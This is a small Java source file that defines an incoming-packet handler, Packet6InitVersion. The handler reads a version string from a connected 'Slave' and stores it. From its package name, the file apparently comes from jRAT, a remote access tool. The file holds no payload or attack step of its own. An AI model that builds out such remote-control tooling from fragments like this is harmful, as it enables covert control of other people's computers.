package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet6InitVersion extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);
	}

}
